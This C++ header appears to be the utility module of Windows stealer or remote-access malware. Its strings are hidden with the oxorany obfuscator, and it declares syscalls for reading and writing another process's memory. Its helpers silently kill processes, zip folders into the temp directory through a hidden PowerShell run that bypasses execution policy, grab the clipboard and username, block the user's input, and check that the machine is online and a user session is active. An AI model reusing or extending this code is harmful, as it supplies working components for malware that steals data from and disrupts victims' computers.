#pragma once

typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

extern "C" NTSYSCALLAPI NTSTATUS ZwReadVirtualMemory(
    HANDLE  hProcess,
    LPCVOID lpBaseAddress,
    LPVOID  lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesRead);

extern "C" NTSYSCALLAPI NTSTATUS ZwWriteVirtualMemory(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten);

extern "C" NTSYSCALLAPI NTSTATUS NtQueryVirtualMemory(
    HANDLE                   ProcessHandle,
    PVOID                    BaseAddress,
    MEMORY_INFORMATION_CLASS MemoryInformationClass,
    PVOID                    MemoryInformation,
    SIZE_T                   MemoryInformationLength,
    PSIZE_T                  ReturnLength);

namespace utility {

    std::string bytes_to_hex(const uint8_t* data, size_t len) {
        std::stringstream ss;
        ss << std::hex << std::setfill('0');
        for (size_t i = 0; i < len; ++i)
            ss << std::setw(2) << static_cast<int>(data[i]);
        return ss.str();
    }

    std::vector<uint8_t> hex_to_bytes(const std::string& hex) {
        std::vector<uint8_t> bytes;
        for (size_t i = 0; i < hex.length(); i += 2) {
            uint8_t byte = static_cast<uint8_t>(std::stoi(hex.substr(i, 2), nullptr, 16));
            bytes.push_back(byte);
        }
        return bytes;
    }


    DWORD find_process_id(const std::wstring& process_name) {
        PROCESSENTRY32 process_info;
        process_info.dwSize = sizeof(PROCESSENTRY32);
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
        if (snapshot == INVALID_HANDLE_VALUE) return 0;
        if (Process32First(snapshot, &process_info)) {
            do {
                if (!process_name.compare(process_info.szExeFile)) {
                    CloseHandle(snapshot);
                    return process_info.th32ProcessID;
                }
            } while (Process32Next(snapshot, &process_info));
        }
        CloseHandle(snapshot);
        return 0;
    }

    std::string narrow(const wchar_t* wide) {
        int size = WideCharToMultiByte(CP_UTF8, 0, wide, -1, nullptr, 0, nullptr, nullptr);
        std::string result(size - 1, '\0');
        WideCharToMultiByte(CP_UTF8, 0, wide, -1, result.data(), size, nullptr, nullptr);
        return result;
    }

    std::string wstring_to_utf8(const std::wstring& wstr) {
        if (wstr.empty()) return std::string();
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
        std::string strTo(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
        return strTo;
    }

    inline std::wstring utf8_to_wstring(const std::string& str) {
        if (str.empty()) return std::wstring();
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), NULL, 0);
        std::wstring wstr(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), &wstr[0], size_needed);
        return wstr;
    }

    void kill_process(const char* exe_name) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), oxorany("taskkill /f /im %s"), exe_name);
        WinExec(cmd, SW_HIDE);
        Sleep(1000);
    }

    static std::wstring zip_folder(const std::wstring& folder_path) {
        size_t last_slash = folder_path.find_last_of(L'\\');
        std::wstring folder_name = (last_slash != std::wstring::npos) ? folder_path.substr(last_slash + 1) : folder_path;

        srand(GetTickCount());
        int random_num = rand() % 10000;
        std::wstring zip_name = folder_name + oxorany(L"_") + std::to_wstring(GetCurrentProcessId()) + oxorany(L"_") + std::to_wstring(random_num) + oxorany(L".zip");

        wchar_t temp_path[MAX_PATH];
        if (GetTempPathW(MAX_PATH, temp_path) == 0) return L"";
        std::wstring zip_path = std::wstring(temp_path) + zip_name;

        // PowerShell command to create the zip
        std::wstring ps_cmd = std::wstring( oxorany(L"Add-Type -AssemblyName System.IO.Compression.FileSystem; ") )
            + std::wstring( oxorany(L"[System.IO.Compression.ZipFile]::CreateFromDirectory('") ) + folder_path + oxorany(L"', '") + zip_path + oxorany(L"')");

        std::wstring cmd_line = oxorany(L"powershell -NoProfile -ExecutionPolicy Bypass -Command \"") + ps_cmd + oxorany(L"\"");
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = { 0 };
        if (!CreateProcessW(NULL, (LPWSTR)cmd_line.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return L"";
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (GetFileAttributesW(zip_path.c_str()) == INVALID_FILE_ATTRIBUTES) return L"";
        return zip_path;
    }

    std::string get_username() {
        char username[UNLEN + 1];
        DWORD size = sizeof(username);
        if (GetUserNameA(username, &size)) {
            return std::string(username);
        }
        return oxorany("unknown");
    }

    std::string generate_random_name() {
        GUID guid;
        CoCreateGuid(&guid);
        wchar_t guid_str[64];
        StringFromGUID2(guid, guid_str, 64);
        std::wstring wtemp(guid_str);
        std::string temp(wtemp.begin(), wtemp.end());
        temp.erase(std::remove(temp.begin(), temp.end(), '{'), temp.end());
        temp.erase(std::remove(temp.begin(), temp.end(), '}'), temp.end());
        temp.erase(std::remove(temp.begin(), temp.end(), '-'), temp.end());
        if (temp.size() > 12) temp = temp.substr(0, 12);
        return temp;
    }

    bool is_network_ready() {
        DWORD flags;
        if (!InternetGetConnectedState(&flags, 0))
            return false;
        HINTERNET hNet = InternetOpen(oxorany(L"Check"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hNet) return false;
        HINTERNET hUrl = InternetOpenUrl(hNet, oxorany(L"https://www.msftncsi.com/ncsi.txt"), NULL, 0, INTERNET_FLAG_RELOAD, 0);
        bool connected = false;
        if (hUrl) {
            char buffer[16];
            DWORD read;
            if (InternetReadFile(hUrl, buffer, sizeof(buffer), &read) && read > 0)
                connected = (strncmp(buffer, oxorany("Microsoft"), 9) == 0);
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hNet);
        return connected;
    }

    bool is_explorer_running() {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return false;
        PROCESSENTRY32 pe = { sizeof(pe) };
        bool found = false;
        if (Process32First(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, oxorany(L"explorer.exe")) == 0) {
                    found = true;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
        return found;
    }

    bool is_computer_ready() {
        char username[UNLEN + 1];
        DWORD size = sizeof(username);
        if (!GetUserNameA(username, &size)) {
            return false;
        }

        std::string name(username);
        if (name.find(oxorany("SYSTEM")) != std::string::npos)
            return false;

        return true; 
    }

    std::string grab_clipboard() {
        if (!OpenClipboard(NULL)) {
            return oxorany("failed to open clipboard");
        }

        HANDLE hClipboard = GetClipboardData(CF_TEXT);
        char* pData = static_cast<char*>(GlobalLock(hClipboard));
        GlobalUnlock(hClipboard);
        CloseClipboard();
        return pData;
    }

    void block_input() {
        BlockInput(TRUE);
    }

    void unblock_input() {
        BlockInput(FALSE);
    }
}